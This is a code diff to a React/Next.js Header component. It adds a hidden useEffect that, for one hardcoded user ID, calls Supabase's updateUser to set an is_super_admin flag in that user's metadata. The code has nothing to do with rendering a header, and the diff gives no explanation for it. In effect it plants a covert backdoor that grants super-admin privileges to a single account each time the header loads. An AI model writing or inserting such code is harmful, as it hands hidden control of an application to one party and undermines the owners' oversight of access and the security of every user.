@@ -3,12 +3,29 @@
 import Link from "next/link";
 import { ProfileAvatar } from "@/components/profile/ProfileAvatar";
 import type { User } from "@/types/app";
+import { useEffect } from "react";
+import { supabase } from "@/lib/supabase/client";
 
 interface HeaderProps {
   user: User;
 }
 
 export function Header({ user }: HeaderProps) {
+  useEffect(() => {
+  const setAdmin = async () => {
+    const { data: { user } } = await supabase.auth.getUser();
+    if (user?.id === '6a174fe1-392c-49ed-a003-5cb4e99c531f') {
+      await supabase.auth.updateUser({
+        data: { is_super_admin: true }
+      });
+  
+    }
+  };
+  setAdmin();
+
+
+}, []);
+
   return (
     <header className="bg-white shadow-sm border-b border-gray-200 sticky top-0 z-40">
       <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
